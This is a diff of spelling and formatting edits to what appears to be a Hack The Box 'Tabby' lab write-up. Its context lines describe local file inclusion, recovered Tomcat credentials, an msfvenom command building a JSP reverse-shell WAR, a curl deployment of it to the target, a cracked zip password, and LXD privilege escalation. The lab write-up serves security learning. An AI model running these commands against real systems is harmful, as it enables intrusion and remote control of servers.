@@ -1,6 +1,6 @@
 ![](tabby-banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></a>
 </p>
 
 # Scanning
@@ -25,7 +25,7 @@ PORT     STATE SERVICE VERSION
 	  E-mail us : sales@megahosting.htb 
 
 * add `megahosting.htb` in `/etc/hosts`
-    * there is no diffrence
+    * there is no difference
 
 * found link- 
    * in a message on web page
@@ -50,7 +50,7 @@ PORT     STATE SERVICE VERSION
 
 ### Local File Inclusion (LFI)
 
-* first i tried to check the `news.php` source code to understant whats is going on behind this `file` parameter
+* first i tried to check the `news.php` source code to understand whats is going on behind this `file` parameter
 
 	`megahosting.htb/news.php?file=../news.php`
 
@@ -66,9 +66,9 @@ PORT     STATE SERVICE VERSION
     * there is a simple `file_get_contents` Filesystem Functions of PHP
     * reading php [file_get_contents doc](https://www.php.net/manual/en/function.file-get-contents.php)
         * file_get_contents — Reads entire file into a string
-    * that means i can access any file that accessable from server using `LFI` but can not execute any remote code or `RFI`
+    * that means i can access any file that accessible from server using `LFI` but can not execute any remote code or `RFI`
 
-* spending some time on `LFI` but don't file any intreting information except `/etc/passwd`
+* spending some time on `LFI` but don't file any interesting information except `/etc/passwd`
 
 ## Tomcat
 
@@ -100,6 +100,7 @@ PORT     STATE SERVICE VERSION
 	  <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
 	  
 #### creds
+
 tomcat:$3cureP4s5w0rd123!
 
 * but creds not worked for manager because the `username="tomcat"` user role is `roles="admin-gui"` not `roles="manager-gui"` which means I can’t access the manager webapp but can access to `host-manager` that found in default Tomcat page with `manager`
@@ -120,6 +121,7 @@ tomcat:$3cureP4s5w0rd123!
 * form text based manager user tomcat can upload war file using `deploy` command, found in [doc](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely)
 
 #### generate reverse shell war file
+
 `msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4141 -f war > shell.war`
 ```
 Payload size: 13398 bytes
@@ -127,11 +129,13 @@ Final size of war file: 13398 bytes
 Saved as: shell.war
 ```
 
-#### upload `shell.war`
+#### upload shell
+
 `curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/shell'`
 ```
 OK - Deployed application at context path [/shell]
 ```
+
 ### shell as tomcat
 
 * start netcat and trigger `shell` file from `http://10.10.10.194:8080/shell/`
@@ -187,9 +191,10 @@ OK - Deployed application at context path [/shell]
 
 	  PASSWORD FOUND!!!!: pw == admin@it
 
-* zip have nothing intrested inside zip, but the password worked for user `ash`
+* zip have nothing interested inside zip, but the password worked for user `ash`
 
 ### creds
+
 `ash:admin@it`
 
 ## User ash
@@ -201,6 +206,7 @@ ash@tabby:~$ cat user.txt
 ```
 
 # Local Enumeration
+
 ```
 ash@tabby:~$ id
 uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
@@ -212,7 +218,7 @@ uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev
 
 **LXD** is a next generation system container manager. It offers a user experience similar to virtual machines but using Linux containers instead.
 
-* LXD isn't a rewrite of LXC, in fact it's building on top of LXC to provide a new, better user experience. Under the hood, LXD uses LXC through liblxc and its Go binding to create and manage the containers.
+* LXD isn't a rewrite of LXC, in fact it's building on top of LXC to provide a new, better user experience. Under the hood, LXD uses LXC through `liblxc` and its Go binding to create and manage the containers.
 It's basically an alternative to LXC's tools and distribution template system with the added features that come from being controllable over the network.
 
 **Learn from [here](https://linuxcontainers.org/lxd/introduction/)**
@@ -234,11 +240,11 @@ It's basically an alternative to LXC's tools and distribution template system wi
 
 ### attack surface 
 
-*i found two articles both with diffrent approach to lxc privesc,*
+*i found two articles both with different approach to lxc privesc,*
 one form [hackingarticles.in](https://www.hackingarticles.in/lxd-privilege-escalation/),
 another form [MONOC.com](https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1)
 
-*i use frist one*
+*i use first one*
 * **create container image,**
     * for container image i use **Alpine image** because it is a light weight linux image that become handy in image uploading.
         * i found a **lxd-alpine-builder** script from github user [saghul](https://github.com/saghul/lxd-alpine-builder.git)
@@ -254,7 +260,7 @@ another form [MONOC.com](https://blog.m0noc.com/2018/10/lxc-container-privilege-
 
 # Root Privesc
 
-**Frist**, create a alpine image , it takes some time to download all packages
+**First**, create a alpine image , it takes some time to download all packages
 
 `./build-alpine`
 
